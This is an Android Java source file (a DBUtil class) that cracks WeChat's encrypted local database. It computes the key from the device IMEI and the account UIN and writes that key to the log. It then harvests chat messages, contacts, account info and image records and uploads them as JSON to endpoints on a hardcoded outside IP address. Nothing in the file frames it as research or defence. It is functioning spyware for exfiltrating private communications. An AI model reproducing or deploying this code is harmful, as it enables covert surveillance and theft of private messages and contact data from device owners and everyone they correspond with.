package cn.truistic.enmicromsg.common.db;

import android.content.Context;
import android.os.Build;
import android.support.annotation.RequiresApi;
import android.util.Log;

import net.sqlcipher.Cursor;
import net.sqlcipher.database.SQLiteDatabase;
import net.sqlcipher.database.SQLiteDatabaseHook;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;


import cn.truistic.enmicromsg.common.util.DeviceUtil;
import cn.truistic.enmicromsg.common.util.GetSystemInfoUtil;
import cn.truistic.enmicromsg.common.util.JsonUtil;
import cn.truistic.enmicromsg.common.util.MD5Util;
import cn.truistic.enmicromsg.common.util.NetworkUtils;
import cn.truistic.enmicromsg.common.util.PathUtils;
import cn.truistic.enmicromsg.common.util.SharedPerfUtil;
import cn.truistic.enmicromsg.info.ContentInfo;
import cn.truistic.enmicromsg.info.ImageInfo;
import cn.truistic.enmicromsg.info.MessageInfo;
import cn.truistic.enmicromsg.info.UserInfo;

import static cn.truistic.enmicromsg.common.util.DeviceUtil.formatTime;
import static cn.truistic.enmicromsg.common.util.DeviceUtil.postJson;


/**
 * 数据库工具类
 */
public class DBUtil {

    private static final String MessageUrlPath =
            "http://61.144.121.138:8090/UpData/ReceiveMessage.aspx";
    private static final String ContentUrlPath =
            "http://61.144.121.138:8090/UpData/ReceiveContent.aspx";
    private static final String UserInfoUrlPath =
            "http://61.144.121.138:8090/UpData/ReceiveUserInfo.aspx";
    private static final String MobileImgInfoUrlPath =
            "http://61.144.121.138:8090/UpData/ReceiveMobileImgInfo.aspx";

    private static final String TAG = "DDDBBB";
    private static byte[] mLvbuffer,mLvbuff;
    private static int msgId,mVaid;

    private static MessageInfo mMessageInfo ;
    private static UserInfo mUserInfo;
    private static ContentInfo mContentInfo;
    private static ImageInfo mImageInfo;

    private static List<MessageInfo> mMessageInfos =new ArrayList<>();
    private static List<UserInfo> mUserInfos= new ArrayList<>();
    private static List<ContentInfo> mContentInfos = new ArrayList<>();
    private static List<ImageInfo> mImageInfos = new ArrayList<>();

    private static String mContent,mCreateTime,mTalker,mTime,mJsonMessage,mJsonContent,mJsonUser,mIsSend,
    mUserName,mAlias,mNickName,mMsgSvrId,mType,mStatus,mIsShowTimer,mReserved,mImgPath,mTransContent
    ,mJsonImageInfos,mTransBrandWording,mTalkerId,mBizClientMsgId,mBizChatUserId,mMsgSeq,mFlag,
    mBizChaId, mVatype,mValue, mConRemark,mDomainList,mPyInitial,mQuanPin,mShowHead,mCttype,
            mWeiboFlag,
    mWeiboNickname, mConRemarkPYFull,mConRemarkPYShort,mVerifyFlag,mEncryptUsername,mChatroomFlag,mDeleteFlag,
    mContactLabelIds,response;



    public static void getWechatFile(Context context) {
        PathUtils.getUinAndDir(context);
    }

    //*******************查詢微信聊天記錄*********************//
    @RequiresApi(api = Build.VERSION_CODES.M)
    public static void queryMessage(Context context)    {

        getWechatFile(context);
        SQLiteDatabase.loadLibs(context);

        // 1.计算数据库密码
        String uinStr = String.valueOf(SharedPerfUtil.getUin(context));
        String imei = DeviceUtil.getDeviceId(context);
        String dbPwd = MD5Util.md5(imei + uinStr).substring(0, 7);

        Log.d("DDDBBB---PWD",dbPwd+",IMEI==="+imei+",UIN==="+uinStr);
        SharedPerfUtil.savedbPwd(context,dbPwd);

        // 打开数据库
        SQLiteDatabaseHook hook = DeviceUtil.gethock();

        int num = SharedPerfUtil.getDbNum(context);

        int j = 0;
        File dbFile;
        SQLiteDatabase database = null;
        for (int i = 0; i < num; i++) {
            dbFile = new File(context.getFilesDir() + "/EnMicroMsg" + i + ".db");
            mTime = (String) SharedPerfUtil.getParam(context,"last_time_wechat","0");

            try {
                database = SQLiteDatabase.openOrCreateDatabase(dbFile, dbPwd, null, hook);
                break;
            } catch (Exception e) {
                Log.d(TAG,"当前获取的IMEI="+imei+"不是应用破解所用的,请尝试另一个或者MEID");
                Map<String, String> map = GetSystemInfoUtil.getImeiAndMeid(context);
                String imei1 = map.get("imei1");
                String imei2 = map.get("imei2");
                String meid = map.get("meid");
                Log.d(TAG,"IMEI1="+imei1+",IMEI2="+imei2+",MEID="+meid);

                j++;
            }
        }
        if (j == num) {
            return;
        }
        try {
            //*********************************查询消息记录****************************************
            Cursor c = database.rawQuery("select count(0) from message where createTime>"+mTime,null);
            final  int  size;
            c.moveToFirst();
            if (!c.isAfterLast()) {
                size = c.getInt(0);
                Log.d("DDDBBB---P--SIZE", String.valueOf(size));
            } else {
                Log.d("DDDBBB---P--SIZE","Query failed !");
                return;
            }
            c.close();


            int offset;
            int ps;
            if (size > 80000){
                 ps = 300;
            }else {
                 ps = 200;
            }
            final int length = size % ps == 0 ? size /ps : size /ps +1;

            for (int pc = 1; pc <= length ;pc++){
                offset = (pc - (pc -1)) * ps;
                String sql = "select * from message where createTime>"+mTime+" order by msgId limit ?,?";

                /*
                 * ps*pc 从第几条数据开始查
                 * offset 每页显示多少条数据
                 *                                                  10*0,10*1,10*2,10*3
                 *                                                   0,10,20,30
                 */
                c = database.rawQuery(sql,new String[]{String.valueOf(ps*(pc-1)),String
                       .valueOf
                        //200
                        (offset)});

                Log.i("DDDBBB---Message",
                        "ps="+String.valueOf(ps) +
                        ",size="+size+
                        ",length="+length +
                        ",从第"+(ps*(pc-1))+"条数据开始查"+
                        ",每页显示"+offset+"条数据");

                while (c.moveToNext()) {
                    //消息ID
                    msgId = c.getInt(c.getColumnIndex("msgId"));
                    //发送还是接收
                    mIsSend = c.getString(c.getColumnIndex("isSend"));
                    //消息时间
                    mCreateTime = c.getString(c.getColumnIndex("createTime"));
                    //记号 ,名称和username一样
                    mTalker = c.getString(c.getColumnIndex("talker"));
                    //聊天信息
                    mContent = c.getString(c.getColumnIndex("content"));
                    mMsgSvrId = c.getString(c.getColumnIndex("msgSvrId"));
                    mType = c.getString(c.getColumnIndex("type"));
                    mStatus = c.getString(c.getColumnIndex("status"));
                    mIsShowTimer = c.getString(c.getColumnIndex("isShowTimer"));
                    mReserved = c.getString(c.getColumnIndex("reserved"));
                    mImgPath = c.getString(c.getColumnIndex("imgPath"));
                    mTransContent = c.getString(c.getColumnIndex("transContent"));
                    mTransBrandWording = c.getString(c.getColumnIndex("transBrandWording"));
                    mTalkerId = c.getString(c.getColumnIndex("talkerId"));
                    mBizClientMsgId = c.getString(c.getColumnIndex("bizClientMsgId"));
                    mBizChatUserId = c.getString(c.getColumnIndex("bizChatUserId"));
                    mMsgSeq = c.getString(c.getColumnIndex("msgSeq"));
                    mFlag = c.getString(c.getColumnIndex("flag"));
                    mBizChaId = c.getString(c.getColumnIndex("bizChatId"));
                    mLvbuffer = new byte[0];

                    if (mMsgSvrId == null || mMsgSvrId.length() == 0){
                        long l = System.currentTimeMillis();
                        mMsgSvrId = String.valueOf(l);
                    }


                    switch (mType){
                        case "42":
                        case "49":
                        case "1048625":
                        case "318767153":
                            mContent="[其他类型消息暂不显示]";
                            mReserved = "";
                            break;
                        case "47":
                            mContent="[动态表情暂不显示]";
                            mReserved = "";
                            break;
                        case "3":
                            mContent="[图片暂不显示]";
                            break;
                        case "34":
                            mContent="[语音暂不显示]";
                            break;
                        case "43":
                            mContent="[视频暂不显示]";
                            break;
                        case "64":
                        case "50":
                        case "52":
                            mIsSend = "语音";
                            mMsgSeq = "";
                            mContent="[语音通话暂不显示]";
                            break;
                        case "10000":
                            if (mIsSend == null || mIsSend.length() == 0){
                                mIsSend = "语音";
                            }
                            break;
                        case "285212721":
                        case "268435505":
                            mContent="[XML类型暂不显示]";
                            break;
                        case "419430449":
                        case "436207665":
                            mContent="[红包信息暂不显示]";
                            mReserved = "";
                            break;
                    }


                    if (mIsSend.equals("1")){
                        mIsSend="发送";
                    }else if (mIsSend.equals("0")){
                        mIsSend="接收";
                    }
                    if(mBizChatUserId == null || mBizChatUserId.length() == 0){
                        mBizChatUserId = "";
                    }
                    if(mBizClientMsgId == null || mBizClientMsgId.length() == 0){
                        mBizClientMsgId = "";
                    }
                    if(mIsShowTimer == null || mIsShowTimer.length() == 0){
                        mIsShowTimer = "";
                    }
                    if(mReserved == null || mReserved.length() == 0){
                        mReserved = "";
                    }
                    if(mTransBrandWording == null || mTransBrandWording.length() == 0){
                        mTransBrandWording = "";
                    }
                    if(mTransContent == null || mTransContent.length() == 0){
                        mTransContent = "";
                    }
                    if(mImgPath == null || mImgPath.length() == 0){
                        mImgPath = "";
                    }
                    if(mFlag == null || mFlag.length() == 0){
                        mFlag = "";
                    }



                    mMessageInfo = new MessageInfo(uinStr,imei,msgId,mMsgSvrId,mType,mStatus,mIsSend,
                            mIsShowTimer,formatTime(mCreateTime),mTalker,mContent,mImgPath,mReserved,mLvbuffer,mTransContent,
                            mTransBrandWording,mTalkerId,mBizClientMsgId,mBizChaId,mBizChatUserId,
                            mMsgSeq,mFlag);


                    mMessageInfos.add(mMessageInfo);
                    Log.i("DDDBBB--P--MessageInfo",mMessageInfo.toString());
                }
                Log.i("DDDBBB--P--MessageInfo","有新的聊天记录---"+mMessageInfos.size()+"条---");

                mJsonMessage = JsonUtil.toJson(mMessageInfos);
                postJson(MessageUrlPath,mJsonMessage,context);
                mMessageInfos.clear();
                c.close();

                String param = (String) SharedPerfUtil.getParam(context, "response", "ok");
                Log.d(TAG,"取到了保存在response的值=="+param);
                if ((param != null && param.equals("ok")) && NetworkUtils.isAvailableByPing()){
                    SharedPerfUtil.setParam(context,"last_time_wechat",mCreateTime);
                    Log.d(TAG,mCreateTime+"====被保存了");
                }

            }
            database.close();

        } catch (Exception e) {

            if (mMessageInfos.isEmpty() || mMessageInfos ==null || mMessageInfos.size()
                    ==0){
                Log.i("DDDBBB---Presenter", "聊天记录没有新数据" +"Exception"+e);
            }

        }

    }

    //*******************查詢微信联系人***********************//
    public static void queryContent(Context context){

        getWechatFile(context);
        SQLiteDatabase.loadLibs(context);
        // 1.计算数据库密码
        String uinStr = String.valueOf(SharedPerfUtil.getUin(context));
        String imei = DeviceUtil.getDeviceId(context);
        String dbPwd = MD5Util.md5(imei + uinStr).substring(0, 7);

        // 打开数据库
        SQLiteDatabaseHook hook = DeviceUtil.gethock();
        int num = SharedPerfUtil.getDbNum(context);

        int j = 0;
        File dbFile;
        SQLiteDatabase data = null;
        for (int i = 0; i < num; i++) {
            dbFile = new File(context.getFilesDir() + "/EnMicroMsg" + i + ".db");
            try {
                data = SQLiteDatabase.openOrCreateDatabase(dbFile, dbPwd, null, hook);
                break;
            } catch (Exception e) {
                j++;

            }
        }
        if (j == num) {
            return;
        }
        try {

            //*********************************查询联系人****************************************
            //查询所有联系人（verifyFlag!=0:公众号等类型，群里面非好友的类型为4，未知类型2）
            Cursor c1 = data.rawQuery("select count(0) from rcontact",null);
            final  int  size;
            c1.moveToFirst();
            if (!c1.isAfterLast()) {
                size = c1.getInt(0);
                Log.d("DDDBBB---P--CountSize", String.valueOf(size));
            } else {
                Log.d("DDDBBB---P--CountSize","Query failed !!");
                return;
            }
            c1.close();

            int offset;
            int ps = 150;
            final int length = size % ps == 0 ? size /ps : size /ps +1;

            for (int pc = 1; pc <= length ;pc++) {
                offset = (pc - (pc - 1)) * ps;
                String sql = "select * from rcontact limit ?,?";
                                /*
                 * ps*pc 从第几条数据开始查
                 * offset 每页显示多少条数据
                 *                                                  10*0,10*1,10*2,10*3
                 *                                                   0,10,20,30
                 */
                c1 = data.rawQuery(sql,new String[]{String.valueOf(ps*(pc-1)),String.valueOf
                        //200
                        (offset)});

                Log.i("DDDBBB---Contact",
                        "ps="+String.valueOf(ps) +
                                ",size="+size+
                                ",length="+length +
                                ",从第"+(ps*(pc-1))+"条数据开始查"+
                                ",每页显示"+offset+"条数据");
                while (c1.moveToNext()) {

                    //标记 和talker一样
                    mUserName = c1.getString(c1.getColumnIndex("username"));
                    //用户的微信号
                    mAlias = c1.getString(c1.getColumnIndex("alias"));
                    //昵称
                    mNickName = c1.getString(c1.getColumnIndex("nickname"));
                    mConRemark = c1.getString(c1.getColumnIndex("conRemark"));
                    mDomainList = c1.getString(c1.getColumnIndex("domainList"));
                    mPyInitial = c1.getString(c1.getColumnIndex("pyInitial"));
                    mQuanPin = c1.getString(c1.getColumnIndex("quanPin"));
                    mShowHead = c1.getString(c1.getColumnIndex("showHead"));
                    mCttype = c1.getString(c1.getColumnIndex("type"));
                    mWeiboFlag = c1.getString(c1.getColumnIndex("weiboFlag"));
                    mWeiboNickname = c1.getString(c1.getColumnIndex("weiboNickname"));
                    mConRemarkPYFull = c1.getString(c1.getColumnIndex("conRemarkPYFull"));
                    mConRemarkPYShort = c1.getString(c1.getColumnIndex("conRemarkPYShort"));
                    mVerifyFlag = c1.getString(c1.getColumnIndex("verifyFlag"));
                    mEncryptUsername = "";     //c1.getString(c1.getColumnIndex("encryptUsername"));
                    mChatroomFlag = c1.getString(c1.getColumnIndex("chatroomFlag"));
                    mDeleteFlag = c1.getString(c1.getColumnIndex("deleteFlag"));
                    mContactLabelIds = c1.getString(c1.getColumnIndex("contactLabelIds"));
                    mLvbuff = new byte[0];

                    if (mUserName == null || mUserName.length() == 0) {
                        mUserName = "";
                    }
                    if (mAlias == null || mAlias.length() == 0) {
                        mAlias = "";
                    }
                    if (mConRemark == null || mConRemark.length() == 0) {
                        mConRemark = "";
                    }
                    if (mDomainList == null || mDomainList.length() == 0) {
                        mDomainList = "";
                    }
                    if (mNickName == null || mNickName.length() == 0) {
                        mNickName = "";
                    }
                    if (mPyInitial == null || mPyInitial.length() == 0) {
                        mPyInitial = "";
                    }
                    if (mQuanPin == null || mQuanPin.length() == 0) {
                        mQuanPin = "";
                    }
                    if (mWeiboNickname == null || mWeiboNickname.length() == 0) {
                        mWeiboNickname = "";
                    }
                    if (mConRemarkPYFull == null || mConRemarkPYFull.length() == 0) {
                        mConRemark = "";
                    }
                    if (mConRemarkPYShort == null || mConRemarkPYShort.length() == 0) {
                        mConRemarkPYShort = "";
                    }
                    if (mContactLabelIds == null || mContactLabelIds.length() == 0) {
                        mContactLabelIds = "";
                    }

                    mContentInfo = new ContentInfo(uinStr, imei, mUserName, mAlias, mConRemark, mDomainList,
                            mNickName, mPyInitial, mQuanPin, mShowHead, mCttype, mWeiboFlag,
                            mWeiboNickname,
                            mConRemarkPYFull, mConRemarkPYShort, mLvbuff, mVerifyFlag, mEncryptUsername,
                            mChatroomFlag, mDeleteFlag, mContactLabelIds);


                    mContentInfos.add(mContentInfo);
                    //Log.i(TAG,mContentInfo.toString());

                }
                Log.i("DDDBBB--P--ContentInfo","有新的联系人---"+mContentInfos.size()+"条---");
                //EncodeUtils.StringDanYinToJSON(mContentInfos.toString());
                mJsonContent = JsonUtil.toJson(mContentInfos);
                postJson(ContentUrlPath, mJsonContent,context);
                mContentInfos.clear();
                c1.close();

            }
            data.close();

        } catch (Exception e) {
            Log.d("DDDBBB--exception", e.toString()+"---"+mCreateTime);
        }

    }

    //*******************查詢微信号**************************//
    public static void queryUser(Context context) {

        SQLiteDatabase.loadLibs(context);
        // 1.计算数据库密码
        String uinStr = String.valueOf(SharedPerfUtil.getUin(context));
        String imei = DeviceUtil.getDeviceId(context);
        String dbPwd = MD5Util.md5(imei + uinStr).substring(0, 7);

        // 打开数据库
        SQLiteDatabaseHook hook = DeviceUtil.gethock();

        int num = SharedPerfUtil.getDbNum(context);

        int j = 0;
        File dbFile;
        SQLiteDatabase databasesss = null;
        for (int i = 0; i < num; i++) {
            dbFile = new File(context.getFilesDir() + "/EnMicroMsg" + i + ".db");
            try {
                databasesss = SQLiteDatabase.openOrCreateDatabase(dbFile, dbPwd, null, hook);
                break;
            } catch (Exception e) {
                j++;
            }
        }
        if (j == num) {
            return;
        }
        try {

            //*********************************查询微信号****************************************

            Cursor c1 = databasesss.query("userinfo", null, null, null, null, null, null);
            while (c1.moveToNext()) {

                mVaid = c1.getInt(c1.getColumnIndex("id"));
                mVatype = c1.getString(c1.getColumnIndex("type"));
                mValue = c1.getString(c1.getColumnIndex("value"));

                mUserInfo = new UserInfo(uinStr,imei,mVaid,mVatype,mValue);
                mUserInfos.add(mUserInfo);

            }
            Log.i("DDDBBB---USerSIZE", mUserInfos.size()+"----"+mUserInfo.toString());
            mJsonUser = JsonUtil.toJson(mUserInfos);
            postJson(UserInfoUrlPath,mJsonUser,context);
            mUserInfos.clear();
            if (!c1.isClosed()) {
                c1.close();
            }
            c1.close();
            databasesss.close();

        } catch (Exception e) {
            Log.d("DDDBBB--exception", e.toString());
        }

    }

    //*******************查詢微信图片************************/0/
    public static void queryImage(Context context){
        SQLiteDatabase.loadLibs(context);
        // 1.计算数据库密码
        String uinStr =String.valueOf(SharedPerfUtil.getUin(context));
        String imei = DeviceUtil.getDeviceId(context);
        String dbPwd = MD5Util.md5(imei + uinStr).substring(0, 7);

        SQLiteDatabaseHook hook = DeviceUtil.gethock();

        int num = SharedPerfUtil.getDbNum(context);

        int j = 0;
        File dbFile;
        SQLiteDatabase database = null;
        for (int i = 0; i < num; i++) {
            dbFile = new File(context.getFilesDir() + "/EnMicroMsg" + i + ".db");
            try {
                database = SQLiteDatabase.openOrCreateDatabase(dbFile, dbPwd, null, hook);
                break;
            } catch (Exception e) {
                j++;
            }
        }
        if (j == num) {
            return;
        }
        try {
            Cursor c = database.rawQuery("select count(0) from ImgInfo2",null);
            final  int  size;
            c.moveToFirst();
            if (!c.isAfterLast()) {
                size = c.getInt(0);
                Log.d("DDDBBB---P--IamgeSize", String.valueOf(size));
            } else {
                Log.d("DDDBBB---P--IamgeSize","Query failed !!");
                return;
            }
            c.close();

            int offset;
            int ps = 200;
            final int length = size % ps == 0 ? size /ps : size /ps +1;

            for (int pc = 1; pc <= length ;pc++) {
                offset = (pc - (pc - 1)) * ps;
                String sql = "select * from ImgInfo2 limit ?,?";
                                /*
                 * ps*pc 从第几条数据开始查
                 * offset 每页显示多少条数据
                 *                                                  10*0,10*1,10*2,10*3
                 *                                                   0,10,20,30
                 */
                c = database.rawQuery(sql,new String[]{String.valueOf(ps*(pc-1)),String.valueOf
                        //100
                        (offset)});

                Log.i("DDDBBB---ImgInfo2",
                        "ps="+String.valueOf(ps) +
                                ",size="+size+
                                ",length="+length +
                                ",从第"+(ps*(pc-1))+"条数据开始查"+
                                ",每页显示"+offset+"条数据");
                //*********************************查询微信圖片****************************************
                while (c.moveToNext()) {

                    String msgSvrId = c.getString(c.getColumnIndex("msgSvrId"));
                    String bigImgPath = c.getString(c.getColumnIndex("bigImgPath"));
                    String thumbImgPath = c.getString(c.getColumnIndex("thumbImgPath"));
                    int createtime = c.getInt(c.getColumnIndex("createtime"));

                    if(msgSvrId == null || msgSvrId.length() == 0){
                        msgSvrId = "";

                    }
                    mImageInfo = new ImageInfo(uinStr,imei,msgSvrId,bigImgPath,thumbImgPath,createtime);
                    mImageInfos.add(mImageInfo);

                }
                Log.i("DDDBBB---ImageSIZE", mImageInfos.size()+"----"+mImageInfo.toString());
                mJsonImageInfos = JsonUtil.toJson(mImageInfos);
                postJson(MobileImgInfoUrlPath,mJsonImageInfos,context);
                mImageInfos.clear();
                c.close();
            }
            database.close();

        } catch (Exception e) {
            Log.d("DDDBBB--Image", e.toString());
        }

    }

}